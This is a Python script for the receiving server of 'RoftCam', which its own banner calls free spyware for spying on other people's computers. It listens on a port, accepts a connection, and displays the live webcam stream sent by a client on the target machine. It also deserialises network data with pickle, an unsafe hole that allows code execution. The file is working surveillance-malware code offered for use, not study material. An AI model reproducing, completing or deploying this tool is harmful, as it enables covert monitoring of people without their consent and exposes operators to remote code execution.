import socket
import pickle
import struct
import cv2
import numpy as np
import sys
import os
from colorama import Fore, Style, init
init(autoreset=True)
class Colors:
    PURPLE = Fore.MAGENTA
    GREEN = Fore.GREEN
    WHITE = Fore.WHITE
    CYAN = Fore.CYAN
    RED = Fore.RED
    YELLOW = Fore.YELLOW
    RESET = Style.RESET_ALL
    BOLD = Style.BRIGHT

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')
def print_banner():
    clear_screen()
    print(f"{Colors.PURPLE}{Colors.BOLD}")
    print("▒█▀▀█ █▀▀█ █▀▀ ▀▀█▀▀ ▒█▀▀█ █▀▀█ █▀▄▀█")
    print("▒█▄▄▀ █░░█ █▀▀ ░░█░░ ▒█░░░ █▄▄█ █░▀░█")
    print("▒█░▒█ ▀▀▀▀ ▀░░ ░░▀░░ ▒█▄▄█ ▀░░▀ ▀░░░▀")
    print(f"{Colors.RESET}")
    print(f"{Colors.WHITE}Welcome to {Colors.CYAN}RoftCam{Colors.WHITE}, a free spyware software for spying on other")
    print(f"people's computers. Please remember to use it {Colors.YELLOW}responsibly{Colors.WHITE} and {Colors.YELLOW}carefully{Colors.WHITE}.")
    print(f"{Colors.WHITE}{'─' * 70}{Colors.RESET}\n")
def get_local_ip():
    """Get the local IP address"""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        return "127.0.0.1"
def install_dependencies():
    """Check and install required dependencies"""
    required = {
        'opencv-python': 'cv2',
        'colorama': 'colorama',
        'numpy': 'numpy'
    }
    
    missing = []
    for package, import_name in required.items():
        try:
            __import__(import_name)
        except ImportError:
            missing.append(package)
    if missing:
        print(f"{Colors.YELLOW}[!] Installing missing dependencies...{Colors.RESET}")
        for package in missing:
            print(f"{Colors.CYAN}[*] Installing {package}...{Colors.RESET}")
            os.system(f"{sys.executable} -m pip install {package} --quiet")
        print(f"{Colors.GREEN}[✓] All dependencies installed successfully!{Colors.RESET}\n")
def start_server():
    print_banner()
    PORT = 9999
    server_ip = get_local_ip()
    print(f"{Colors.PURPLE}[•] Your server IP address: {Colors.WHITE}{server_ip}{Colors.RESET}")
    print(f"{Colors.YELLOW}[!] Share this IP with the client to connect{Colors.RESET}")
    print(f"{Colors.PURPLE}[•] Server port: {Colors.WHITE}{PORT}{Colors.RESET}\n")
    input(f"{Colors.GREEN}[→] Press ENTER to start the server...{Colors.RESET}")
    print(f"\n{Colors.CYAN}[*] Initializing RoftCam Server...{Colors.RESET}")
    print(f"{Colors.WHITE}{'─' * 70}{Colors.RESET}")
    try:
        server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        host_ip = '0.0.0.0'
        server_socket.bind((host_ip, PORT))
        server_socket.listen(5)
        print(f"{Colors.GREEN}[✓] Server started successfully!{Colors.RESET}")
        print(f"{Colors.PURPLE}[•] Listening on: {Colors.WHITE}{server_ip}:{PORT}{Colors.RESET}")
        print(f"{Colors.PURPLE}[•] Waiting for client connection...{Colors.RESET}")
        print(f"{Colors.YELLOW}[!] Press 'q' in the video window to quit{Colors.RESET}")
        print(f"{Colors.WHITE}{'─' * 70}{Colors.RESET}\n")
        client_socket, addr = server_socket.accept()
        print(f"{Colors.GREEN}[✓] Connection established!{Colors.RESET}")
        print(f"{Colors.CYAN}[*] Connected to: {Colors.WHITE}{addr[0]}:{addr[1]}{Colors.RESET}")
        print(f"{Colors.CYAN}[*] Starting live video stream...{Colors.RESET}\n")
        data = b""
        payload_size = struct.calcsize("Q")
        cv2.namedWindow('RoftCam - Live Feed', cv2.WINDOW_NORMAL)
        cv2.resizeWindow('RoftCam - Live Feed', 1280, 720)
        frame_count = 0
        while True:
            while len(data) < payload_size:
                packet = client_socket.recv(4096)
                if not packet:
                    break
                data += packet
            if len(data) < payload_size:
                break
            packed_msg_size = data[:payload_size]
            data = data[payload_size:]
            msg_size = struct.unpack("Q", packed_msg_size)[0]
            while len(data) < msg_size:
                data += client_socket.recv(4096)
            frame_data = data[:msg_size]
            data = data[msg_size:]
            frame = pickle.loads(frame_data)
            frame = cv2.imdecode(np.frombuffer(frame, dtype=np.uint8), cv2.IMREAD_COLOR)
            frame_count += 1
            overlay = frame.copy()
            cv2.rectangle(overlay, (0, 0), (frame.shape[1], 40), (139, 0, 139), -1)
            cv2.addWeighted(overlay, 0.7, frame, 0.3, 0, frame)
            cv2.putText(frame, f"RoftCam Live | Frame: {frame_count}", (10, 25),
                       cv2.FONT_HERSHEY_SIMPLEX, 0.7, (255, 255, 255), 2)
            cv2.putText(frame, f"Source: {addr[0]}", (frame.shape[1] - 250, 25),
                       cv2.FONT_HERSHEY_SIMPLEX, 0.6, (255, 255, 255), 2)
            cv2.imshow('RoftCam - Live Feed', frame)
            key = cv2.waitKey(1) & 0xFF
            if key == ord('q'):
                print(f"\n{Colors.YELLOW}[!] Shutting down stream...{Colors.RESET}")
                break
        client_socket.close()
        server_socket.close()
        cv2.destroyAllWindows()
        print(f"{Colors.GREEN}[✓] Connection closed successfully!{Colors.RESET}")
        print(f"{Colors.PURPLE}[•] Total frames received: {Colors.WHITE}{frame_count}{Colors.RESET}")
    except Exception as e:
        print(f"{Colors.RED}[✗] Error: {str(e)}{Colors.RESET}")
    finally:
        try:
            cv2.destroyAllWindows()
        except:
            pass

if __name__ == "__main__":
    try:
        install_dependencies()
        start_server()
    except KeyboardInterrupt:
        print(f"\n{Colors.YELLOW}[!] Server interrupted by user{Colors.RESET}")
    except Exception as e:
        print(f"{Colors.RED}[✗] Fatal error: {str(e)}{Colors.RESET}")
